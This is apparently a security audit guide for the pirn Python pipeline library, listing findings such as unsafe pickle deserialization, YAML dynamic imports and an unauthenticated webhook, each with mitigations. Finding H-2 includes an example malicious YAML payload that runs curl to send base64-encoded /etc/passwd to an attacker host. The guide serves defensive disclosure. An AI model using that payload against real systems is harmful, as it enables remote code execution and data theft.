# pirn Security Guide

**Last updated:** 2026-04-29  
**Applies to:** pirn 0.x (all current releases)

---

## Table of Contents

1. [Security Model and Trust Boundaries](#1-security-model-and-trust-boundaries)
2. [Findings](#2-findings)
   - [CRITICAL](#critical)
   - [HIGH](#high)
   - [MEDIUM](#medium)
   - [LOW](#low)
   - [INFO / Compliance](#info--compliance)
3. [Deployment Security Checklist](#3-deployment-security-checklist)
4. [YAML Pipeline Security](#4-yaml-pipeline-security)
5. [Data Sensitivity Guidance](#5-data-sensitivity-guidance)
6. [Responsible Disclosure](#6-responsible-disclosure)

---

## 1. Security Model and Trust Boundaries

pirn is a library, not a service. Its security posture is determined almost entirely by how the surrounding deployment configures and exposes it.

### Trust boundaries

| Component | Trusted inputs | Untrusted / adversarial inputs |
|-----------|---------------|-------------------------------|
| `Knot.run()` | Pipeline author code, in-process data | External API responses flowing through knots |
| Data stores (S3, ValKey, disk) | Bytes written by pirn itself | An attacker who can write to the store |
| YAML loader | Pipeline YAML authored by a developer | YAML from end users or external systems |
| HTTP trigger | Authenticated callers | The open internet (no built-in auth) |
| Kafka trigger | Messages on the subscribed topic | Any producer that can write to that topic |
| `ExceptionManager` | Internal exception objects | N/A — but stored data may leak secrets |
| `tapestry-check` CLI | Command-line arguments from developers | Arbitrary module paths if invoked in CI on untrusted input |

### Key assumptions pirn makes

- The data store (S3, ValKey, local disk) is **not writable by adversaries**. If that assumption is violated, deserialization of pickled data becomes remote code execution (see finding C-1).
- YAML pipeline files are **authored by trusted developers** unless `allow_callable_refs` is explicitly set and guarded (see finding H-2).
- HTTP and Kafka trigger endpoints are **wrapped in authentication and authorization** at the infrastructure or application layer (see finding H-3).
- Connection strings and credentials are **not present in knot local variables** at the time an exception is raised (see finding M-4 and M-7).

---

## 2. Findings

### CRITICAL

---

#### C-1: Insecure deserialization — pickle over untrusted stores

**Severity:** CRITICAL  
**CWE:** CWE-502 (Deserialization of Untrusted Data)  
**Affected files:**
- `pirn/backends/s3.py` — `S3DataStore.get()` calls `pickle.loads(payload)` on bytes read from S3
- `pirn/backends/valkey.py` — `ValKeyDataStore.get()` calls `pickle.loads(payload)` on bytes from ValKey
- `pirn/backends/disk.py` — `LocalDiskDataStore._deserialize()` calls `pickle.loads(payload)` on bytes from disk

**Description:**  
All three data-store backends deserialize stored values using `pickle.loads()`. Python's pickle is an arbitrary code execution primitive: a specially crafted pickle stream executes Python code during deserialization, before any application logic can inspect the payload.

An attacker who can write to any of these stores — via a misconfigured S3 bucket ACL, an unauthenticated or weakly authenticated ValKey instance, direct filesystem access, or a compromised upstream knot — gains remote code execution on every process that subsequently calls `get()` on that store.

The threat is amplified by pirn's content-addressed caching model: a single poisoned hash entry is replayed to every knot that consumed the same logical value, potentially across all future pipeline runs.

**Mitigations (in priority order):**

1. **Replace pickle with a safe serialization format.** For structured data, use `msgspec`, `orjson`, or standard JSON. For arbitrary Python objects, consider `cloudpickle` only when you own both ends of the wire and accept the security model, or use a schema-validated format (Arrow IPC, Parquet) for array/dataframe payloads.

2. **Add HMAC integrity verification before deserialization.** Sign every payload at write time with a secret key that only the pirn process knows. Verify the signature before calling `pickle.loads()`. This prevents an adversary who can write arbitrary bytes from producing a valid pickle.

   ```python
   import hmac, hashlib, pickle

   def _serialize(self, value, secret: bytes) -> bytes:
       raw = pickle.dumps(value, protocol=5)
       sig = hmac.new(secret, raw, hashlib.sha256).digest()
       return sig + raw  # 32-byte prefix

   def _deserialize(self, payload: bytes, secret: bytes):
       sig, raw = payload[:32], payload[32:]
       expected = hmac.new(secret, raw, hashlib.sha256).digest()
       if not hmac.compare_digest(sig, expected):
           raise ValueError("payload signature mismatch — possible tampering")
       return pickle.loads(raw)
   ```

3. **Enforce strict ACLs on the backing store.** S3 bucket policy should deny `s3:PutObject` to all principals except the pirn worker role. ValKey should require authentication (`requirepass` / ACL) and deny writes from any source other than worker IPs. Disk store root should be owned by the pirn process user and not world-writable.

4. **Provide safe serializer hooks.** `LocalDiskDataStore` already exposes `_serialize`/`_deserialize` as override points. Document and promote this pattern in the other backends so operators can substitute JSON, msgpack, or any safe format without forking the codebase.

---

### HIGH

---

#### H-2: Arbitrary code execution via YAML loader dynamic imports

**Severity:** HIGH  
**CWE:** CWE-94 (Improper Control of Generation of Code), CWE-470 (Use of Externally-Controlled Input to Select Classes or Code)  
**Affected files:**
- `pirn/yaml_loader/loader.py` — `_resolve_callable()` with `allow_imports=True`

**Description:**  
When `allow_callable_refs: true` is set in a pipeline YAML file, `_resolve_callable()` calls `importlib.import_module(module_path)` on dotted paths supplied directly from the YAML. If the YAML originates from an untrusted source — a user-uploaded file, a git repository with write access from external contributors, a shared config store — the caller can import any importable Python module and call any attribute on it.

Example of a malicious payload:
```yaml
allow_callable_refs: true
knots:
  - id: exfil
    callable: os:system
    config:
      cmd: "curl https://attacker.example/$(cat /etc/passwd | base64)"
```

Even without an explicit RCE payload, importing attacker-chosen modules may trigger side effects (e.g., modules with top-level `__import__` or `subprocess` calls in their module body).

The flag defaults to `False`, which is correct. However, there is no logged warning when it is enabled, and no documentation that instructs operators about the risk.

**Mitigations:**

1. **Never enable `allow_callable_refs` when YAML is user-supplied.** Treat any pipeline YAML coming from outside the application deployment as untrusted. Validate it against an allowlist of knot classes before loading.

2. **Add a startup warning when `allow_callable_refs` is True:**
   ```python
   import warnings
   if allow_callable_refs:
       warnings.warn(
           "allow_callable_refs=True enables dynamic Python imports from YAML. "
           "Only use with YAML authored by trusted developers.",
           stacklevel=2,
       )
   ```

3. **Implement an import allowlist.** Accept an optional `allowed_modules: list[str]` parameter to the YAML loader. Reject any `callable_ref` whose module path does not start with an allowlisted prefix.

4. **Consider removing `allow_callable_refs` from the public API** in favour of a code-first API where all knot classes are registered explicitly before YAML is parsed. This eliminates the attack surface entirely.

---

#### H-3: Unauthenticated HTTP trigger

**Severity:** HIGH  
**CWE:** CWE-306 (Missing Authentication for Critical Function)  
**Affected files:**
- `pirn/triggers/http.py` — `WebhookTrigger`

**Description:**  
`WebhookTrigger` exposes a Starlette POST endpoint that accepts arbitrary JSON and constructs a `RunRequest` from it. There is no authentication, no rate limiting, and no IP allowlisting in the trigger itself. Any caller that can reach the listening port can trigger a pipeline run with arbitrary parameters.

The library currently defers this entirely to "deployment", but provides no example, helper, or documented pattern for adding auth. In practice this means many deployments will be deployed without auth.

**Mitigations:**

1. **Add a built-in shared-secret middleware option** as a low-friction default:
   ```python
   WebhookTrigger(
       port=8080,
       auth_token="env:PIRN_WEBHOOK_TOKEN",  # reads from env var
   )
   ```
   Reject requests whose `Authorization: Bearer <token>` header does not match.

2. **Document the required deployment steps prominently.** Add a section to the trigger docstring and to `docs/deployment-sizing.md` showing how to add a Starlette `Middleware` for bearer token or mTLS verification.

3. **Add optional rate limiting.** Accept a `rate_limit_per_minute` parameter and enforce it with a sliding window counter. This limits the blast radius even if auth is bypassed.

4. **Restrict the listening interface.** Default to `host="127.0.0.1"` rather than `0.0.0.0` so the endpoint is not exposed on all interfaces unless explicitly configured.

---

### MEDIUM

---

#### M-4: Credential exposure in error messages (DSN in tracebacks)

**Severity:** MEDIUM  
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information), CWE-209 (Generation of Error Message Containing Sensitive Information)  
**Affected files:**
- `pirn/backends/postgres.py` — `_LazyPool._dsn` stored as instance attribute
- `pirn/managers/exceptions.py` — `ExceptionRecord.traceback_text` stored verbatim

**Description:**  
`_LazyPool` stores the full Postgres DSN (e.g., `postgresql://user:password@host/db`) as `self._dsn`. If `asyncpg.create_pool()` raises (wrong password, unreachable host, SSL mismatch), asyncpg includes the DSN in its exception message. That exception propagates to `ExceptionManager`, which captures the full traceback including the exception message into `ExceptionRecord.traceback_text`. This record is then persisted to whichever history backend is configured (Postgres, SQLite, DuckDB), potentially exposing the password to anyone who can query the history tables.

**Mitigations:**

1. **Scrub the DSN from the exception before storing it.** In `_LazyPool._create_pool()`, catch asyncpg connection errors and re-raise with a sanitized message:
   ```python
   import re
   def _sanitize_dsn(dsn: str) -> str:
       return re.sub(r'://[^@]+@', '://<redacted>@', dsn)
   ```

2. **Do not store the DSN on the instance.** Build the DSN in a local variable within the method that calls `create_pool()`, then let it go out of scope. This limits the window during which it appears in stack frames.

3. **Apply traceback scrubbing in `ExceptionManager`** before serialization (see M-7 below).

---

#### M-5: Emitter failures silently discarded

**Severity:** MEDIUM  
**CWE:** CWE-390 (Detection of Error Condition Without Action), CWE-778 (Insufficient Logging)  
**Affected files:**
- `pirn/engine/engine.py` — lines with bare `except Exception: pass` around `on_lineage` and `on_run_result` emitter calls

**Description:**  
Security-relevant observability events (lineage records, run results) can be silently dropped if any emitter raises. A Kafka broker going offline, a webhook endpoint returning 500, or an OTel collector being unreachable causes the event to be swallowed with no indication in any log or metric. In a security incident, the absence of these events may be mistaken for normal operation.

**Mitigations:**

1. **Log a warning (not exception) when an emitter fails:**
   ```python
   except Exception as exc:
       logger.warning("emitter %r failed on %s: %s", emitter, event_type, exc)
   ```

2. **Add a metric counter** (`pirn.emitter.failures`) that operators can alert on.

3. **Consider a configurable emitter error policy** (similar to `ErrorPolicy` on knots): `IGNORE`, `WARN`, `RAISE`. Default to `WARN`.

---

#### M-6: No TLS certificate verification configuration for WebhookEmitter

**Severity:** MEDIUM  
**CWE:** CWE-295 (Improper Certificate Validation)  
**Affected files:**
- `pirn/emitters/webhook.py` — `WebhookEmitter` constructs `httpx.AsyncClient(timeout=self._timeout)`

**Description:**  
`WebhookEmitter` uses `httpx.AsyncClient` with default settings, which means TLS verification is enabled by default — this is correct. However, there is no mechanism to configure a custom CA bundle, client certificates, or explicit `verify=True` enforcement. Operators who encounter TLS errors in internal PKI environments may be tempted to set `verify=False` by monkey-patching or subclassing, and there is no documentation warning against this.

Additionally, if `url` configuration is derived from a database or API call (SSRF, see L-10), disabling verification would compound the impact.

**Mitigations:**

1. **Expose `ssl_context` and `verify` parameters** in `WebhookEmitter.__init__()` and pass them to `httpx.AsyncClient`. This gives operators a safe, documented path to custom CAs without disabling verification.

2. **Document that `verify=False` must never be used in production** in the class docstring and in `docs/observability.md`.

---

#### M-7: Full tracebacks with local variable values stored persistently

**Severity:** MEDIUM  
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)  
**Affected files:**
- `pirn/managers/exceptions.py` — `ExceptionRecord.traceback_text`

**Description:**  
`ExceptionRecord.traceback_text` captures the full Python traceback as a string. Python tracebacks rendered with `traceback.format_exc()` include local variable values at each frame level when the traceback formatter is configured to do so, and some third-party formatters (rich, better_exceptions) include them by default. If a knot's `run()` method holds an API key, database password, or bearer token in a local variable at the time an exception is raised, that value will appear in the traceback and be persisted to the history database.

**Mitigations:**

1. **Strip local variable values from tracebacks** before storage. Use `traceback.extract_tb()` and reconstruct the string without locals, or filter out frame-level variable lines from the rendered string.

2. **Document a knot coding convention:** sensitive values (API keys, passwords, tokens) should be retrieved at the last possible moment and not held in named local variables across `await` points. Example:
   ```python
   async def run(self, ctx):
       # Good: resolve secret inline, no named local
       response = await client.get(headers={"Authorization": f"Bearer {await get_secret()}"})
       
       # Avoid: secret in named local variable persists in frame during await
       token = await get_secret()
       response = await client.get(headers={"Authorization": f"Bearer {token}"})
   ```

3. **Consider a `sanitize_traceback` hook** on `ExceptionManager` that operators can configure with custom redaction regex patterns.

---

### LOW

---

#### L-8: Insufficient run_id entropy

**Severity:** LOW  
**CWE:** CWE-330 (Use of Insufficiently Random Values)  
**Affected files:**
- `pirn/engine/engine.py` — `run_id = f"run-{uuid.uuid4().hex[:12]}"`

**Description:**  
`run_id` uses only the first 12 hex characters of a UUID4, providing 48 bits of entropy. The birthday collision probability reaches 50% at approximately 16.7 million runs. When a collision occurs, the history backends use `ON CONFLICT DO UPDATE` (Postgres) or `INSERT OR REPLACE` (SQLite/DuckDB), silently overwriting the earlier run's history record. At high throughput (thousands of runs per day), this becomes a realistic data integrity concern within years of operation.

**Mitigations:**

1. **Use the full UUID4 hex (32 characters, 128 bits):**
   ```python
   run_id = f"run-{uuid.uuid4().hex}"
   ```
   This eliminates practical collision risk entirely.

2. **Alternatively, use a ULID** (lexicographically sortable, 128-bit) for both entropy and useful sort order.

---

#### L-9: knot_id not validated for special characters

**Severity:** LOW  
**CWE:** CWE-20 (Improper Input Validation)  
**Affected files:**
- All backends that store knot_id in history tables
- `pirn/backends/disk.py` — `_path()` uses content hash, not knot_id directly (lower risk here)

**Description:**  
`knot_id` is user-supplied and flows into SQL queries in all history backends. All backends use parameterized queries, so SQL injection is not possible. However, knot_ids containing path separators (`/`, `..`), null bytes (`\x00`), Unicode control characters, or characters that are meaningful in log formats (newlines, ANSI escapes) could:

- Confuse lineage analysis tools that parse knot_id as a path
- Cause log injection if knot_id appears in log output
- Cause display rendering issues in dashboards

**Mitigations:**

1. **Add a validation pattern to `KnotConfig`** (or the Knot base class) that rejects knot_ids containing null bytes, newlines, or path separators:
   ```python
   import re
   KNOT_ID_RE = re.compile(r'^[a-zA-Z0-9_\-\.]{1,128}$')
   
   @field_validator('knot_id')
   def validate_knot_id(cls, v):
       if not KNOT_ID_RE.match(v):
           raise ValueError(f"knot_id {v!r} contains invalid characters")
       return v
   ```

---

#### L-10: WebhookEmitter SSRF potential

**Severity:** LOW  
**CWE:** CWE-918 (Server-Side Request Forgery)  
**Affected files:**
- `pirn/emitters/webhook.py` — `WebhookEmitter`

**Description:**  
`WebhookEmitter` POSTs to a URL specified in the emitter configuration. If that URL is dynamically constructed from pipeline parameters or database values controlled by an adversary (rather than being a hardcoded deployment constant), an attacker could direct requests to internal services (instance metadata endpoints, internal APIs, storage services) not intended to be reachable from the worker network.

This is a LOW severity finding in the current codebase because emitter URLs are typically static deployment configuration. The risk increases if URL configuration is ever made dynamic.

**Mitigations:**

1. **Document that webhook URLs must be static deployment constants**, not derived from pipeline input or user data.

2. **If dynamic URLs are ever added, implement an allowlist** of permitted URL prefixes validated at construction time.

3. **Block RFC-1918 and loopback addresses** using a custom `httpx.Transport` that refuses to connect to private IP ranges.

---

### INFO / Compliance

---

#### I-11: No SECURITY.md / responsible disclosure policy

**Severity:** INFO  
**Affected files:** Repository root (missing)

A `SECURITY.md` file is required by GitHub's security advisory workflow and is expected by security researchers before they report vulnerabilities. See the root-level `SECURITY.md` created alongside this document.

---

#### I-12: No Software Bill of Materials (SBOM)

**Severity:** INFO  
**CWE:** CWE-1357 (Reliance on Insufficiently Trustworthy Component)

No SBOM is generated or published. This makes it difficult for operators to assess exposure to vulnerabilities in transitive dependencies (e.g., a new CVE in `asyncpg`, `httpx`, or `aiokafka`).

**Mitigation:** Add SBOM generation to the CI/CD pipeline:
```yaml
- name: Generate SBOM
  run: uv run cyclonedx-bom -e -o sbom.json
- name: Upload SBOM
  uses: actions/upload-artifact@v4
  with:
    name: sbom
    path: sbom.json
```

Publish the SBOM as a release artifact and consider submitting it to the [OSV](https://osv.dev/) ecosystem for automated vulnerability matching.

---

#### I-13: aiokafka as a core (non-optional) dependency

**Severity:** INFO  
**Affected files:** `pyproject.toml`

`aiokafka>=0.13.0` appears in the base dependencies rather than as an optional extra. Users who have no Kafka infrastructure are forced to install a non-trivial dependency with its own transitive tree (including `kafka-python`), unnecessarily widening the attack surface and the SBOM scope.

**Mitigation:** Move `aiokafka` to the `[kafka]` optional extra. Guard imports with the same try/except pattern already used in `KafkaEmitter._ensure_producer()` and `KafkaTrigger._ensure_consumer()`.

---

#### I-14: Pickle protocol version unspecified

**Severity:** INFO  
**Affected files:** `pirn/backends/s3.py`, `pirn/backends/valkey.py`, `pirn/backends/disk.py`

`pickle.dumps(value)` uses the default protocol, which changes across Python versions (currently protocol 5 on CPython 3.8+). This is not explicitly documented, making it easy for operators to assume cross-version payload compatibility that does not exist.

**Mitigation:**
- Explicitly specify `pickle.dumps(value, protocol=5)` and document the choice.
- Alternatively, migrate to a versioned, cross-language safe format (msgpack, JSON) which eliminates this concern entirely.
- Add a note in `docs/choosing-backends.md` warning that pickle files written by Python 3.x are not guaranteed to be readable by Python 3.y.

---

## 3. Deployment Security Checklist

Use this checklist before deploying pirn to a production environment.

### Authentication and Authorization

- [ ] **HTTP trigger:** A reverse proxy (nginx, Envoy, AWS API Gateway) or Starlette middleware enforcing bearer token, mTLS, or OAuth2 is placed in front of every `WebhookTrigger` instance. The trigger is not reachable from the public internet without authentication.
- [ ] **Kafka trigger:** The Kafka broker requires SASL authentication (`SASL_SSL`). The pirn consumer uses a dedicated service account with read-only ACLs on the subscribed topic. No unauthenticated topic access is permitted.
- [ ] **ValKey / Redis:** `requirepass` or ACL-based authentication is configured. The pirn worker account has the minimum required ACL (`GET`, `SET`, `DEL` on the key prefix it uses). Remote access is disabled (`bind 127.0.0.1`).
- [ ] **S3:** The bucket policy denies public access. The pirn worker IAM role has `s3:GetObject` and `s3:PutObject` only on the pirn data prefix. No `s3:*` wildcard policies exist on the bucket.
- [ ] **Postgres:** The pirn database user has `SELECT`, `INSERT`, `UPDATE` on pirn tables only. `SUPERUSER` and `CREATEROLE` are not granted. The password is stored in a secrets manager (AWS Secrets Manager, HashiCorp Vault) and not hardcoded in the DSN.

### Network Segmentation

- [ ] pirn workers are deployed in a private subnet with no direct inbound internet access.
- [ ] Egress from the worker subnet is restricted to known destinations (database, S3, Kafka, webhook targets) via security group or firewall rules.
- [ ] The `WebhookTrigger` port is not exposed on the worker's public interface. Traffic is routed through a load balancer that enforces TLS termination.

### TLS

- [ ] All connections from pirn workers to external services (Postgres, ValKey, Kafka, S3, webhook targets) use TLS.
- [ ] TLS certificate verification is not disabled anywhere in the deployment configuration.
- [ ] A valid, trusted CA certificate chain is present on all worker nodes.

### Secret Management

- [ ] Database DSNs, API keys, and broker credentials are provided via environment variables or a secrets manager, not hardcoded in pipeline YAML or Python source.
- [ ] Secrets are not logged or stored in plain text in any pirn configuration file committed to source control.

### Data Store Integrity

- [ ] If using `LocalDiskDataStore`, the store root directory is owned by the pirn process user and has permissions `700`.
- [ ] If using `S3DataStore` or `ValKeyDataStore`, access logging is enabled on the store so unauthorized writes can be detected.
- [ ] Consider replacing pickle serialization with HMAC-signed payloads or a non-executable format (see C-1).

### Pipeline YAML

- [ ] `allow_callable_refs` is `false` in all production pipeline YAML files (the default).
- [ ] If `allow_callable_refs` must be `true`, the YAML files are stored in version control with mandatory code review and are not user-editable at runtime.
- [ ] Pipeline YAML is validated with `tapestry-check` in CI before deployment.

### Observability and Incident Response

- [ ] At least one emitter is configured to a durable destination (Kafka topic, webhook to a logging service) so lineage and run events are retained even if the history database is lost.
- [ ] Alerts are configured on emitter failure metrics (see M-5).
- [ ] A `SECURITY.md` and an incident runbook are present in the repository.

### CI/CD

- [ ] The CI workflow pins action versions to SHAs, not mutable tags (`@v4` → `@<sha>`). This prevents supply-chain attacks via tag mutation.
- [ ] SBOM generation is included in the release pipeline (see I-12).
- [ ] Dependency updates are automated via Dependabot or Renovate with a review requirement.

---

## 4. YAML Pipeline Security

### When `allow_callable_refs` is safe

`allow_callable_refs: true` is safe **only** when all of the following conditions hold:

1. The YAML file is stored in a version-controlled repository.
2. Write access to the YAML file requires code review by a trusted team member.
3. The YAML file is loaded at deployment time (not at request time from a user-provided payload).
4. The pirn process does not have elevated system privileges (principle of least privilege).

Typical safe use case: a data engineering team maintains pipeline YAML files in a monorepo alongside the Python source. Merging changes requires two approvals. The YAML is baked into a Docker image at build time.

### When `allow_callable_refs` is not safe

- YAML is uploaded by end users via a web interface.
- YAML is fetched from an external URL or database at runtime.
- YAML is generated programmatically by untrusted code.
- The deployment environment has access to secrets or internal services an attacker would want.

In these cases, set `allow_callable_refs: false` (the default) and use the code-first API exclusively — register all knot classes explicitly in Python before loading YAML.

### Recommended YAML validation pipeline

```bash
# In CI, before any deployment:
tapestry-check myapp.pipeline:build_tapestry --strict

# Additionally, lint YAML files against your schema:
yamllint pipeline.yaml
```

Consider adding a pre-commit hook that runs `tapestry-check` on changed pipeline files.

---

## 5. Data Sensitivity Guidance

### Traceback scrubbing

`ExceptionRecord.traceback_text` stores the full Python traceback. Before pirn adds built-in scrubbing (see M-7), operators can reduce exposure by:

**Option 1 — Knot coding convention**

Do not hold sensitive values in named local variables across `await` points:
```python
# Avoid
async def run(self, ctx):
    api_key = ctx.parameters["api_key"]  # appears in traceback if next line raises
    result = await external_api_call(api_key)
```
```python
# Prefer
async def run(self, ctx):
    result = await external_api_call(ctx.parameters["api_key"])
```

**Option 2 — Post-store scrubbing**

After `ExceptionManager` stores a record, run a scrubbing job that replaces known secret patterns with `<redacted>`:
```python
import re

SECRET_PATTERNS = [
    re.compile(r'(?i)(api[_-]?key|password|token|secret)\s*=\s*\S+'),
    re.compile(r'postgresql://[^@]+@'),
]

def scrub_traceback(text: str) -> str:
    for pattern in SECRET_PATTERNS:
        text = pattern.sub(r'\1=<redacted>', text)
    return text
```

### DSN handling

- Never construct a Postgres DSN from string interpolation in application code where exceptions can be caught.
- Prefer asyncpg's `connect()` keyword arguments (`host`, `port`, `user`, `password`, `database`) over a DSN string. Keyword arguments are less likely to appear in a single exception message.
- When a DSN must be used, read it from an environment variable and pass it through immediately — do not store it on a long-lived object attribute.

### Lineage payload sensitivity

`KnotLineage.payload_json` and `RunResult.model_dump_json()` are stored in history tables. If pipeline parameters include sensitive values (customer IDs, PII, API keys), consider:

- Passing only non-sensitive identifiers as parameters and resolving the actual values inside the knot at runtime.
- Encrypting the `payload_json` field at rest using Postgres column-level encryption or application-layer encryption before storage.

---

## 6. Responsible Disclosure

To report a security vulnerability in pirn, please see [SECURITY.md](../SECURITY.md) in the repository root.

Do not open a public GitHub issue for security vulnerabilities. Use GitHub's private Security Advisory feature or the email address listed in `SECURITY.md`.
